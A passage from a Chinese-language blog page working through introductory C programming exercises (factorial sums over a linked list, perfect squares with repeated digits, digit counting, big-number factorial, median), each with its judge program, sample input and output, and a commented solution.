class="title">Node</span> *<span class="title">PtrToNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> Data; <span class="comment">/* 存储结点数据 */</span></span><br><span class="line">    PtrToNode Next; <span class="comment">/* 指向下一个结点的指针 */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> PtrToNode List; <span class="comment">/* 定义单链表类型 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FactorialSum</span><span class="params">( List L )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line">    List L, p;</span><br><span class="line">    <span class="comment">// 定义2个链表</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 赋初值为 Null</span></span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ ) &#123;</span><br><span class="line">        p = (List)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct Node));</span><br><span class="line">        <span class="comment">// 申请node变量对应大小的内存</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p-&gt;Data);</span><br><span class="line">        p-&gt;Next = L;  L = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, FactorialSum(L));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">5 3 6</span><br><span class="line">输出</span><br><span class="line">846</span><br><span class="line"></span><br><span class="line">阶乘 5!+3!+6!</span><br></pre></td></tr></table></figure></div><h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FactorialSum</span><span class="params">( List L )</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>, i;</span><br><span class="line">  List p = L;</span><br><span class="line">  <span class="comment">// L 赋值给 p, p 变成 null, L不变</span></span><br><span class="line">  <span class="keyword">while</span>(p) &#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= p-&gt;Data; i++)&#123;</span><br><span class="line">      n *= i; <span class="comment">// n = n*i </span></span><br><span class="line">    &#125;</span><br><span class="line">    sum += n;</span><br><span class="line">    p = p-&gt;Next;</span><br><span class="line">    <span class="comment">// p-&gt;next 赋值给 p</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-7-统计某类完全平方数-20分"><a href="#6-7-统计某类完全平方数-20分" class="headerlink" title="6-7 统计某类完全平方数 (20分)"></a>6-7 统计某类完全平方数 (20分)</h2><p>本题要求实现一个函数，判断任一给定整数N是否满足条件：它是完全平方数，又至少有两位数字相同，如144、676等。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsTheNumber</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中 <code>N</code> 是用户传入的参数。如果 <code>N</code> 满足条件，则该函数必须返回1，否则返回0。</p><h3 id="裁判测试程序样例：-6"><a href="#裁判测试程序样例：-6" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsTheNumber</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n1, n2, i, cnt;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n1, &amp;n2);</span><br><span class="line">    cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=n1; i&lt;=n2; i++ ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( IsTheNumber(i) )</span><br><span class="line">            cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cnt = %d\n"</span>, cnt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">105 500</span><br><span class="line">输出</span><br><span class="line">cnt &#x3D; 6</span><br></pre></td></tr></table></figure></div><h3 id="解答-5"><a href="#解答-5" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsTheNumber</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a, temp[<span class="number">500</span>], count=<span class="number">0</span>, i, n=N;</span><br><span class="line">    <span class="keyword">if</span> (N&lt;=<span class="number">0</span>) &#123; <span class="comment">// 输入值为负数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a = (<span class="keyword">int</span>)<span class="built_in">sqrt</span>(N); <span class="comment">// 开根号</span></span><br><span class="line">    <span class="comment">// 强制转换整型</span></span><br><span class="line">    <span class="keyword">if</span> (a*a==N) &#123; </span><br><span class="line">    <span class="comment">// 判断是否为完全平方数</span></span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            temp[count] = n%<span class="number">10</span>; <span class="comment">// 取个位</span></span><br><span class="line">            n = n/<span class="number">10</span>; <span class="comment">// 取是百十位</span></span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;count; i++) &#123; </span><br><span class="line">                <span class="keyword">if</span> (temp[count] == temp[i]) &#123;</span><br><span class="line">                <span class="comment">// 存在与之前取出的数字相同的返回为 1</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count += <span class="number">1</span>; <span class="comment">// count = count + 1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-8-简单阶乘计算-10分"><a href="#6-8-简单阶乘计算-10分" class="headerlink" title="6-8 简单阶乘计算 (10分)"></a>6-8 简单阶乘计算 (10分)</h2><p>本题要求实现一个计算非负整数阶乘的简单函数。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Factorial</span><span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中 <code>N</code> 是用户传入的参数，其值不超过12。如果 <code>N</code> 是非负整数，则该函数必须返回N的阶乘，否则返回0。</p><h3 id="裁判测试程序样例：-7"><a href="#裁判测试程序样例：-7" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Factorial</span><span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, NF;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    NF = Factorial(N); </span><br><span class="line">    <span class="comment">// 阶乘函数 Factorial(5) = 5!</span></span><br><span class="line">    <span class="keyword">if</span> (NF)  <span class="built_in">printf</span>(<span class="string">"%d! = %d\n"</span>, N, NF);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"Invalid input\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">5</span><br><span class="line">输出</span><br><span class="line">5! &#x3D; 120</span><br></pre></td></tr></table></figure></div><h3 id="解答-6"><a href="#解答-6" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Factorial</span><span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, sum=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (N&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (N&gt;<span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">        sum *= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-9-统计个位数字-15分"><a href="#6-9-统计个位数字-15分" class="headerlink" title="6-9 统计个位数字 (15分)"></a>6-9 统计个位数字 (15分)</h2><p>本题要求实现一个函数，可统计任一整数中某个位数出现的次数。例如-21252中，2出现了3次，则该函数应该返回3。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Count_Digit</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N, <span class="keyword">const</span> <span class="keyword">int</span> D )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中 <code>N</code> 和 <code>D</code> 都是用户传入的参数。 <code>N</code> 的值不超过int的范围；<code>D</code>是[0, 9]区间内的个位数。函数须返回N中D出现的次数。</p><h3 id="裁判测试程序样例：-8"><a href="#裁判测试程序样例：-8" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Count_Digit</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N, <span class="keyword">const</span> <span class="keyword">int</span> D )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, D;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;N, &amp;D);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, Count_Digit(N, D));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">-21252 2</span><br><span class="line">输出</span><br><span class="line">3</span><br></pre></td></tr></table></figure></div><h3 id="解答-7"><a href="#解答-7" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Count_Digit</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N, <span class="keyword">const</span> <span class="keyword">int</span> D )</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M=N,cnt=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( N==<span class="number">0</span> &amp;&amp; D==<span class="number">0</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( N&lt;<span class="number">0</span> ) &#123;</span><br><span class="line">    M = -N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>( M!=<span class="number">0</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( D == M%<span class="number">10</span> ) <span class="comment">// M 除以10的余数（求当前个位的数字）</span></span><br><span class="line">    cnt++;</span><br><span class="line">    M/=<span class="number">10</span>; <span class="comment">// M 减少最后一位</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-10-阶乘计算升级版-20分"><a href="#6-10-阶乘计算升级版-20分" class="headerlink" title="6-10 阶乘计算升级版 (20分)"></a>6-10 阶乘计算升级版 (20分)</h2><p>本题要求实现一个打印非负整数阶乘的函数。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Factorial</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中 <code>N</code> 是用户传入的参数，其值不超过 <code>1000</code>。如果 <code>N</code> 是非负整数，则该函数必须在一行中打印出 <code>N!</code> 的值，否则打印“Invalid input”</p><h3 id="裁判测试程序样例：-9"><a href="#裁判测试程序样例：-9" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Factorial</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    Print_Factorial(N);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">15</span><br><span class="line">输出</span><br><span class="line">1307674368000</span><br></pre></td></tr></table></figure></div><h3 id="解答-8"><a href="#解答-8" class="headerlink" title="解答"></a>解答</h3><p>易错点有2个</p><ol><li>当N过大时，<code>long int</code> 也无法满足解的要求</li><li>用数组存放结果时，要注意 <code>进位</code> 在进行最高位计算完毕后，进位可能是多位数；结果在数组中存放的是0~k-1位且高位在后，低位在前</li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Factorial</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(N&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Invalid input"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">int</span> sum=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(N&lt;=<span class="number">12</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">                sum *= i;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%ld"</span>,sum);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (N &gt; <span class="number">12</span> &amp;&amp; N &lt;= <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> sum[<span class="number">3000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">/* 确保保存最终运算结果的数组足够大：</span></span><br><span class="line"><span class="comment">        1-9相乘最多有9位，10-99相乘最多有2*90=180位</span></span><br><span class="line"><span class="comment">        100-999相乘最多有3*900=2700位，1000是4*1=4位</span></span><br><span class="line"><span class="comment">        总计2893位 */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> temp, i, j;</span><br><span class="line">        <span class="keyword">int</span> k = <span class="number">1</span>;  <span class="comment">// 位数</span></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;  <span class="comment">// 进位</span></span><br><span class="line">        sum[<span class="number">0</span>] = <span class="number">1</span>;   <span class="comment">//将结果先初始化为1</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=N;i++) &#123; <span class="comment">//开始阶乘，阶乘元素从2开始</span></span><br><span class="line">        <span class="comment">//和平时乘法方法相同，将临时结果的每位与阶乘元素相乘</span></span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;k;j++) &#123;</span><br><span class="line">                </span><br><span class="line">                temp = sum[j]*i + n;</span><br><span class="line">                <span class="comment">//相应阶乘中的一项与当前所得临时结果的某位相乘（加上进位）</span></span><br><span class="line">                </span><br><span class="line">                sum[j] = temp%<span class="number">10</span>;</span><br><span class="line">                <span class="comment">//更新临时结果的位上信息</span></span><br><span class="line">                </span><br><span class="line">                n = temp/<span class="number">10</span>;</span><br><span class="line">                <span class="comment">//看是否有进位</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(n!=<span class="number">0</span> &amp;&amp; j==k<span class="number">-1</span>)&#123; <span class="comment">//如果有进位</span></span><br><span class="line">                    k++;   <span class="comment">//处理最后进位为两位</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=k<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>,sum[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>因为long数据类型表示的数字范围到 <code>2147483647</code><br>而<code>12!</code>正好是9位数，所以从12为分界点</p><p>采用数组方法存储，设置进位、位数、临时值。</p><p>临时值一定要每一位都与第i个元素相乘。</p><hr><h2 id="6-11-求自定类型元素序列的中位数-25分"><a href="#6-11-求自定类型元素序列的中位数-25分" class="headerlink" title="6-11 求自定类型元素序列的中位数 (25分)"></a>6-11 求自定类型元素序列的中位数 (25分)</h2><p>本题要求实现一个函数，求 <code>N</code> 个集合元素 <code>A[]</code> 的中位数，即序列中第<code>⌊(N+1)/2⌋</code>大的元素。其中集合元素的类型为自定义的 <code>ElementType</code>。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Median</span><span class="params">( ElementType A[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中给定集合元素存放在数组<code>A[]</code>中，正整数N是数组元素个数。该函数须返回N个A[]元素的中位数，其值也必须是 <code>ElementType</code>类型。</p><h3 id="裁判测试程序样例：-10"><a href="#裁判测试程序样例：-10" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span 